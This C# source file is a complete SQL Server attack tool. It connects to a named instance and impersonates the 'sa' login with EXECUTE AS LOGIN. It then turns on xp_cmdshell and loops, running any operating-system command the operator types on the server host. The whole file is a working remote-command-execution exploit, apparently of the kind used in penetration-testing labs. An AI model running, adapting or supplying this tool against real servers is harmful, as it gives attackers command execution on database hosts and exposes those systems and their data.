using System;
using System.Data.SqlClient;

namespace SQL_RCE
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("Enter the SQL Server instance: ");
            String sqlServer = Console.ReadLine();

            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            while (true)
            {
                Console.Write("command :::::> ");
                String execCmd = Console.ReadLine();

                if (execCmd.Equals("exit", StringComparison.OrdinalIgnoreCase))
                {
                    break; // Exit the loop if the user types 'exit'
                }

                command = new SqlCommand("EXEC xp_cmdshell '" + execCmd + "'", con);
                reader = command.ExecuteReader();

                while (reader.Read())
                {
                    Console.WriteLine(reader[0]);
                }

                reader.Close();
            }

            con.Close();
        }
    }
}


